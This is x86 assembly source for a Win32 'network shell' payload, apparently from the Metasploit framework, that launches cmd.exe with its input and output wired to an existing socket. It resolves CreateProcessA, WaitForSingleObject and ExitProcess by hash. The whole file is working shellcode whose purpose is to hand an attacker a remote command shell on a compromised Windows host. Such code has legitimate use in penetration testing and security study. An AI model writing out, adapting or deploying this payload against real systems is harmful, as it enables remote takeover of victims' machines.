;      Title:  Win32 Network Shell
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  hdm[at]metasploit.com

[BITS 32]


; [ebp +  0] = kernel32.dll base
; [ebp +  4] = LGetProcAddress
; [ebp +  8] = LoadLibraryA
; edi        = socket

LSetCommand:
    push "CMD"
    mov ebx, esp
        
LCreateProcessStructs:
    xchg edi, edx       ; save edi to edx
    xor eax,eax         ; overwrite with null
    lea edi, [esp-84]   ; struct sizes
    push byte 21        ; 21 * 4 = 84
    pop ecx             ; set counter
    
LBZero:
	rep stosd           ; overwrite with null
    xchg edi, edx       ; restore edi
    
LCreateStructs:
	sub esp, 84
    mov byte [esp + 16], 68	    ; si.cb = sizeof(si) 
	mov word [esp + 60], 0x0101 ; si.dwflags
    
	; socket handles 
	mov [esp + 16 + 56], edi
	mov [esp + 16 + 60], edi
	mov [esp + 16 + 64], edi

	lea eax, [esp + 16]	; si 
	push esp			; pi 
	push eax
	push ecx
	push ecx
	push ecx
    
    inc ecx
	push ecx
    dec ecx
    
	push ecx
	push ecx
	push ebx
	push ecx

LCreateProcessA:
    push dword [ebp] ; kernel32.dll
    push 0x16b3fe72  ; CreateProcessA
    call [ebp + 4]
    call eax
	mov esi, esp
    
LWaitForSingleObject:
    push dword [ebp] ; kernel32.dll
    push 0xce05d9ad  ; WaitForSingleObject
    call [ebp + 4]
    mov ebx, eax
    
    push 0xFFFFFFFF
    push dword [esi]
    call ebx
    
LDeathBecomesYou:
    push dword [ebp] ; kernel32.dll
    push 0x73e2d87e  ; ExitProcess
    call [ebp + 4]
    
    xor ebx, ebx
    push ebx
    call eax
